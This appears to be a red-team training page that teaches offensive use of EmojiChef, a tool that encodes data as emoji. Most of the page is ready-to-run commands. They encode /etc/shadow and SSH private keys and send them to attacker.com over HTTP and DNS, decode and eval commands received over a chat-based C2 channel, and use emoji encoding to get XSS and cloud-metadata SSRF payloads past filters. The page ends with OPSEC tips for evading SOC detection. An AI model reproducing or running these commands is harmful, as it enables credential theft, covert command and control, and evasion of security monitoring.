---
layout: training-page
title: "EmojiChef — Red Team Academy"
module: "Tool Development"
tags:
  - encoding
  - obfuscation
  - data-exfil
  - python
  - covert-channel
page_key: "tool-dev-emojichef"
render_with_liquid: false
---

# EmojiChef — Emoji Encoding for Offensive Use

EmojiChef is a Python tool that encodes arbitrary data (text and binary) into emoji sequences using base-64, base-128, base-256, or base-1024 encoding schemes. In red team operations it enables covert channel construction, data exfiltration payload encoding, and bypassing text-based filters that allowlist only printable ASCII. Emojis are valid Unicode and pass through most web applications, chat platforms, and logging systems without triggering keyword-based detection.

## Installation

```
git clone https://github.com/FreddyRodgers/emojichef.git
cd emojichef
# No dependencies — pure Python 3.6+
python emojichef-cli.py --help
```

## Encoding Schemes (Recipes)

```
# Four encoding "recipes" of increasing efficiency:
# Quick  (Base-64)   — food emojis   — best for small messages
# Light  (Base-128)  — activity emojis — balanced encoding
# Classic (Base-256) — smiley emojis — standard encoding (default)
# Gourmet (Base-1024) — extended emojis — most efficient, shortest output

# Basic encode:
python emojichef-cli.py encode "exfiltrated data here"
# Output: 😀😃😄😁😆😅😂🤣

# Decode:
python emojichef-cli.py decode "😀😃😄😁😆😅😂🤣"

# Choose recipe:
python emojichef-cli.py encode -r gourmet "Hello World"
python emojichef-cli.py encode -r quick "Hello World"    # food emojis
python emojichef-cli.py encode -r light "Hello World"    # activity emojis
python emojichef-cli.py encode -r classic "Hello World"  # smiley emojis (default)
```

## File Encoding

```
# Encode any file — text or binary:
python emojichef-cli.py encode -f /etc/passwd -o passwd.emoji
python emojichef-cli.py decode -f passwd.emoji -o passwd-recovered.txt

# With compression (reduces output size):
python emojichef-cli.py encode -f sensitive.txt -c zlib -o out.emoji

# With SHA256 integrity check:
python emojichef-cli.py encode -f payload.bin -v sha256 -o payload.emoji

# Batch encode a directory:
python emojichef-cli.py batch "/tmp/loot/*.txt" --batch-output /tmp/encoded/
```

## Red Team Use Cases

### Data Exfiltration via Emoji-Encoded DNS

```
# Encode stolen data as emojis, then transmit via DNS TXT records,
# HTTP headers, or chat platforms that strip non-emoji characters.
# Emojis survive most content filters that block base64 patterns.

# Encode loot:
python emojichef-cli.py encode -f /etc/shadow -c zlib -o shadow.emoji
ENCODED=$(cat shadow.emoji)

# Exfil via HTTP GET parameter (emojis are URL-safe after encoding):
curl "https://attacker.com/collect?d=$(python3 -c 'import urllib.parse; print(urllib.parse.quote(open("shadow.emoji").read()))')"

# Exfil via DNS (split into chunks):
# Split emoji string into 63-char DNS label segments
python3 -c "
data = open('shadow.emoji').read()
chunks = [data[i:i+50] for i in range(0, len(data), 50)]
for i, chunk in enumerate(chunks):
    import urllib.parse
    print(f'chunk{i}.{urllib.parse.quote(chunk)}.exfil.attacker.com')
"
```

### Payload Obfuscation for Chat-Based C2

```
# LLM-based agents and chatbots pass emoji content through to logs.
# Encode commands/results in emoji to avoid keyword matching in SIEM.

# Operator side: encode command
python emojichef-cli.py encode "whoami && hostname && id"
# Send emoji string via Teams/Slack webhook or chat

# Implant side: decode and execute
EMOJI_CMD="😀😃😄..."  # received from C2 channel
CMD=$(echo "$EMOJI_CMD" | python emojichef-cli.py decode /dev/stdin 2>/dev/null)
eval "$CMD"
```

### Bypassing Text-Based Filters

```
# Web applications filtering user input for malicious keywords:
# - "passwd", "shadow", "cmd", "exec", "powershell"
# Encoding as emoji bypasses string matching while keeping data intact.

# Test if an application reflects emoji without stripping:
python emojichef-cli.py encode "<script>alert(1)</script>"
# If the emoji output is reflected in the response, the filter only checks
# plaintext — decode server-side to extract XSS or command injection.

# SSRF via encoded URL:
# Some parsers resolve the data: scheme before filtering:
python emojichef-cli.py encode "http://169.254.169.254/latest/meta-data/"
# Submit emoji string to URL field → server decodes → SSRF executes
```

### Covert File Transfer via Clipboard / Messaging

```
# Scenario: exfiltrate a private key through a monitored Slack channel.
# DLP tools typically scan for PEM headers (-----BEGIN RSA PRIVATE KEY-----)
# but not emoji sequences.

# Attacker machine: encode the key
python emojichef-cli.py encode -f ~/.ssh/id_rsa -c zlib -o key.emoji

# Send the emoji content through Slack DM or email body
cat key.emoji | pbcopy   # macOS clipboard
# Paste into Slack

# Receiver: decode back to PEM
python emojichef-cli.py decode -f received.emoji -o recovered_id_rsa
chmod 600 recovered_id_rsa
ssh -i recovered_id_rsa user@target.com
```

## Analysis Mode

```
# Analyze a file to determine optimal encoding settings:
python emojichef-cli.py analyze -f large_loot.db

# Quiet mode (suppress progress output — useful in scripts):
python emojichef-cli.py encode -f data.txt -q -o out.emoji

# Interactive menu (useful for manual operation):
python emojichef-cli.py interactive
```

## Operational Considerations

```
# Detection notes:
# - Emoji-heavy strings in HTTP parameters are unusual and may trigger
#   anomaly-based detection in mature SOCs.
# - Compression (zlib) produces non-printable-looking emoji sequences
#   that are harder to visually inspect.
# - Base-1024 (gourmet) produces the shortest output — harder to spot
#   as "a lot of emoji" in quick log review.

# OPSEC recommendations:
# 1. Use within platforms where emoji is contextually normal (Slack, Teams)
# 2. Split large payloads into multiple messages to avoid size anomalies
# 3. Combine with legitimate traffic (e.g., emoji in a real-looking message)
# 4. Avoid the tool for actual encryption — it provides encoding only

# Note: EmojiChef is encoding, NOT encryption.
# Encoded data is trivially reversible.
# Do not use for protecting sensitive data in transit.
```

## Resources

- EmojiChef — `github.com/FreddyRodgers/emojichef`
- CyberChef (inspiration) — `github.com/gchq/CyberChef`
- Ecoji 2.0 (Base-1024 emoji encoding) — `github.com/keith-turner/ecoji`
- emojicoding (Base-1024) — `github.com/shea256/emojicoding`
